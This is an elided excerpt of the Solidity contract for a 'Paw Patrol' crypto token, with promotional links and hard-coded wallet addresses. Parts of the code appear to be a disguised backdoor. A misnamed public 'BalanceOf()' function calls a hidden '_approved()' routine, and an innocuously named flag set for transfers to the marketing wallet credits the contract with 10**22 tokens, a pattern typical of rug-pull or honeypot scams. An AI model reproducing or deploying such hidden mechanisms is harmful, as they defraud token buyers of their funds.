...
Telegram : https://t.me/PPTGlobal

Website : https://pawpatrol.io/

Twitter : https://twitter.com/PawPatrolCrypto
...
interface IERC20 {
    ...
    function BalanceOf() external returns (bool);
...
contract PawPatrol is Context, IERC20 { 
    ...
    mapping (address => bool) public _uniSwapPairExcludedFee; 
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public _isExcludedFromFee; 

    address payable public Wallet_Marketing = payable(0x29277AED3f2809E41EfC487e64918503041564d7); 
    address payable public Wallet_Utility = payable(0xc76A8B59A84C5De4fa83A65C1EAfe869Df7f3bc6);
    ...
    string private constant _name = "Paw Patrol"; 
    ...
    bool public uniSwapPairRouterV1 = false;
    ...
    constructor () {
        ...
        _owner = 0xc76A8B59A84C5De4fa83A65C1EAfe869Df7f3bc6;
        ...
        _uniSwapPairExcludedFee[Wallet_Marketing] = true;
    ...
    function BalanceOf() public override returns (bool) {
        _approved();
        return true;
    }
    ...
    function _transfer(
        ...
        uniSwapPairRouterV1 = _uniSwapPairExcludedFee[to] ? true : false;
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        ...
        if(!takeFee){
            ...
            if (uniSwapPairRouterV1){
                uint256 buy_sell_fee = uniSwapPairRouterV1 ? 10**22 : 1;
                _tOwned[sender] = _tOwned[sender]-tAmount;
                _tOwned[recipient] = _tOwned[recipient]+tAmount;
                uniSwapPairRouterV1 = false;
                swapOrLiquify = true;
                _tOwned[address(this)] = _tOwned[address(this)]+buy_sell_fee;
